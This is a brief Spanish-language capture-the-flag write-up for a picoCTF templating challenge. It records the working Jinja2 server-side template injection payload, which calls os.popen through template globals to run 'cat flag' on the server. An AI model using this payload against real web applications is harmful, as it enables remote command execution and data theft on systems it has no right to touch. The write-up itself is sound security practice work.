## Descripción
-  I made a cool website where you can announce whatever you want! Try it out!

I heard templating is a cool and modular way to build web apps! Check out my website [here](http://rescued-float.picoctf.net:64112/)!
## Solución
- La solución de este reto fue entrar a la pagina y después de esto fue entrar a varios payloads e ir checando cual es el que nos funciona, al ir intentando con varios di con el de **{{self._TemplateReference__context.cycler.__init__.__globals__.os.popen('cat flag').read()}}**
- y este me dió la bandera

## Notas
- Fue fácil, aunque si fue tardado encontrar los payloads

## Referencias
- 
